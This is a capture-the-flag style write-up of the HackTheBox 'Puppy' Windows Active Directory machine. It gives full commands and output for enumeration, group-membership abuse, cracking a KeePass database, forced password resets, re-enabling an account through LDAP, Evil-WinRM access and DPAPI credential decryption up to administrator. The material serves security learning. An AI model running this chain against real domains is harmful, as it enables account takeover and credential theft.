- - - 
created : 22-09-2025 

Tags : #medium 

Released on 17 May 2025 (Season 8)
- - - 
# Machine Information

As is common in real life pentests, you will start the Puppy box with credentials for the following account: 

`levi.james / KingofAkron2025!`
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ rustscan -a puppy.htb -- -A 

Open 10.10.11.70:53
Open 10.10.11.70:88
Open 10.10.11.70:111
Open 10.10.11.70:135
Open 10.10.11.70:139
Open 10.10.11.70:389
Open 10.10.11.70:445
Open 10.10.11.70:464
Open 10.10.11.70:593
Open 10.10.11.70:636
Open 10.10.11.70:2049
Open 10.10.11.70:3260
Open 10.10.11.70:3268
Open 10.10.11.70:3269
Open 10.10.11.70:5985
Open 10.10.11.70:9389
Open 10.10.11.70:49664
Open 10.10.11.70:49667
Open 10.10.11.70:49670
Open 10.10.11.70:49674
Open 10.10.11.70:49694
Open 10.10.11.70:63157
Open 10.10.11.70:63193

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-22 16:45:24Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3260/tcp  open  iscsi?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63157/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63193/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (85%)

```

Notice we have [Windows](../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md).
# Enumeration
## RPC (111)

We can try user [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on rpc with `rpcclient` :

```shell
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ rpcclient puppy.htb -U levi.james

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

So we have users on the domain:

```bash
Administrator  
Guest  
krbtgt  
levi.james  
ant.edwards  
adam.silver  
jamie.williams  
steph.cooper  
steph.cooper_adm  
```
## SMB (445)
### SMBmap

We can use [SMBclient](../../../3%20-%20Tags/Hacking%20Tools/SMBclient.md) or [SMBmap](../../../3%20-%20Tags/Hacking%20Tools/SMBmap.md) on the target to list the shares:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!' 

[+] IP: 10.10.11.70:445 Name: puppy.htb                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[|] Closing connections..                                                                                            [/] Closing connections..                                                                                            [-] Closing connections..                                                                                            [*] Closed 1 connections        
```

We can see the `DEV`directory that is currently inaccessible.
## Bloodhound

We add `dc.puppy.htb`to `/etc/hosts`, and then synchronize the time:

```bash
ntpdate puppy.htb
```

Now we use [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md) to collect data:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ bloodhound-python -u 'levi.james' -p 'KingofAkron2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 23S
INFO: Compressing output into 20250922133821_bloodhound.zip
```

We open the file with the Bloodhound GUI.
# Exploit

We can see that `james` has write permission for `developers` group, so we can add this user to that group:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy/bloodyhound]
└─$ bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
[+] levi.james added to DEVELOPERS
```

Now we can enter `SMB`the `DEV`directory:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy/bloodyhound]
└─$ smbclient  //10.10.11.70/DEV -U levi.james  
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Mar 23 08:07:57 2025
  ..                                  D        0  Sat Mar  8 17:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 08:09:12 2025
  Projects                            D        0  Sat Mar  8 17:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 03:25:46 2025

                5080575 blocks of size 4096. 1618279 blocks available
```

We download `recovery.kdbx`:

```bash
smb: \> get recovery.kdbx 
getting file \recovery.kdbx of size 2677 as recovery.kdbx (1,7 KiloBytes/sec) (average 1,7 KiloBytes/sec)
smb: \> exit
```

We try to use `keepass2john`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ keepass2john recovery.kdbx 
! recovery.kdbx : File version '40000' is currently not supported!
```

	not supported!

We have to find another way to crack the password for the db.
## Keepass4brute

We can find this tool on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ git clone https://github.com/r3nt0n/keepass4brute.git
Clone in 'keepass4brute' in corso...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (21/21), done.
remote: Total 24 (delta 10), reused 9 (delta 2), pack-reused 0 (from 0)
Ricezione degli oggetti: 100% (24/24), 18.26 KiB | 381.00 KiB/s, fatto.
Risoluzione dei delta: 100% (10/10), fatto.

$ cat README.md                                             
## About the project

KDBX 4.x format (Keepass >=2.36) is not supported by `keepass2john` yet, so there is no known way to extract the hash and crack it.

This tool is a quick and dirty patch for the current situation. It tries to bruteforce the passphrase testing a provided wordlist directly against the db file.


## Dependencies

+ keepassxc-cli


## Usage

./keepass4brute.sh <kdbx-file> <wordlist>
```

Install dependencies:

```bash
$ sudo apt install keepassxc  
```

Use it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy/keepass4brute]
└─$ ./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 144 - Estimated time remaining: 9 weeks, 6 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

Now we can use this password to open the file with `keepassxc`:

![Pasted image 20250922140725.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250922140725.png)

We have a list of users and their passwords, we check [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) with them:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ smbclient  //10.10.11.70/DEV -U ant.edwards                   
Password for [WORKGROUP\ant.edwards]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 08:07:57 2025
  ..                                  D        0  Sat Mar  8 17:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 08:09:12 2025
  Projects                            D        0  Sat Mar  8 17:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 03:25:46 2025

                5080575 blocks of size 4096. 1617968 blocks available
```

We have the account that has been successfully verified: `ant.edwards`
## Bloodhound AGAIN

Now we can collect data on the new user:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ bloodhound-python -u 'ant.edwards' -p '{{REDACTED_PASSWD}}'  -d puppy.htb -ns 10.10.11.70 -c All --zip
```

We can see  `ant.edwards` is group of `devs` which has `GenericAll` permissions on the user`adam.silver`, so we can change his password:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p '{{REDACTED_PASSWD}}' set password ADAM.SILVER Hacker123456!
[+] Password changed successfully!
```

Although the changes here are successful, We still cannot log in. The reason is that the account is not enabled, we can check it out with `ldapsearch`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"
Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <DC=puppy,DC=htb> with scope subtree
# filter: (sAMAccountName=ADAM.SILVER)
# requesting: ALL
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Adam D. Silver
sn: Silver
givenName: Adam
initials: D
distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
instanceType: 4
whenCreated: 20250219121623.0Z
whenChanged: 20250922192745.0Z
displayName: Adam D. Silver
uSNCreated: 12814
memberOf: CN=DEVELOPERS,DC=PUPPY,DC=HTB
memberOf: CN=Remote Management Users,CN=Builtin,DC=PUPPY,DC=HTB
uSNChanged: 176375
name: Adam D. Silver
objectGUID:: 6XTdGwRTsk6ta8cxNx8K6w==

   userAccountControl: 66050

badPwdCount: 1
codePage: 0
countryCode: 0
homeDirectory: C:\Users\adam.silver
badPasswordTime: 134030214938198322
lastLogoff: 0
lastLogon: 133863842265461471
pwdLastSet: 134030428652572945
primaryGroupID: 513
userParameters:: ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI
 CAgUAQaCAFDdHhDZmdQcmVzZW5045S15pSx5oiw44GiGAgBQ3R4Q2ZnRmxhZ3Mx44Cw44Gm44Cy44
 C5EggBQ3R4U2hhZG9344Cw44Cw44Cw44CwKgIBQ3R4TWluRW5jcnlwdGlvbkxldmVs44Sw
objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHUQQAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 6
sAMAccountName: adam.silver
sAMAccountType: 805306368
userPrincipalName: adam.silver@PUPPY.HTB
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PUPPY,DC=HTB
dSCorePropagationData: 20250309210803.0Z
dSCorePropagationData: 20250228212238.0Z
dSCorePropagationData: 20250219143627.0Z
dSCorePropagationData: 20250219142657.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133863576267401674

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```

`userAccountControl: 66050` Indicates that the account is disabled.

Use `ldapmodify`to modify this value:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W << EOF
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF

Enter LDAP Password: 
modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"
```
## EvilWinRM

Now we can use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) to access with the changed password:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Hacker123456!' 

*Evil-WinRM* PS C:\Users\adam.silver> cd Desktop
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> dir


    Directory: C:\Users\adam.silver\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
-ar---         9/22/2025   4:01 AM             34 user.txt


*Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
{{REDACTED_FLAG}}
```
# Lateral Movement - Privilege Escalation
## Adam.Silver to Steph.Cooper

There is a `Backup`directory:

```bash
*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> dir


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip
                                        
Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip
```

We can `unzip` it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Puppy]
└─$ unzip site-backup-2024-12-30.zip -d site_backup
Archive:  site-backup-2024-12-30.zip
   creating: site_backup/puppy/
  inflating: site_backup/puppy/nms-auth-config.xml.bak  
<SNIP>
```

We have a file with a user credentials:

```xml
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Puppy/site_backup/puppy]
└─$ cat nms-auth-config.xml.bak 

<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>{{REDACTED_PASSWD}}</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

`steph.cooper`{{REDACTED_PASSWD}}  can be used to log in:

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> dir
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> dir -h


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

We can see there's a key in the `Credentials` folder.

The credentials are saved in **Windows Credential Manager : It uses** **DPAPI encryption (CryptProtectData) and binds** **the MasterKey** of the user or computer.

First we need to download the keys, we can't use `download`, we can use [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md).

Now we use the password and `SID` to decrypt the user's `DPAPI` to output the user's `master key` (decrypted):

```bash
impacket-dpapi masterkey -file masterkey_encrypted -password '{{REDACTED_PASSWD}}' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
```

Now we decrypt the stored credentials `credential_encrypted` using the master key obtained before, outputting the plain-text credentials:

```bash
impacket-dpapi credential -file credential_encrypted -key {{REDACTED_KEY}}
```

`steph.cooper_adm`is the user obtained.

[Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md) again for data:

```bash
bloodhound-python -u 'steph.cooper_adm' -p '{{REDACTED_PASSWD}}'  -d puppy.htb -ns 10.10.11.70 -c All --zip
```

Now you can simply log in with [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) and `type` the root flag:

```bash
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/22/2025   4:01 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
{{REDACTED_PASSWD}}
```

Pwned!!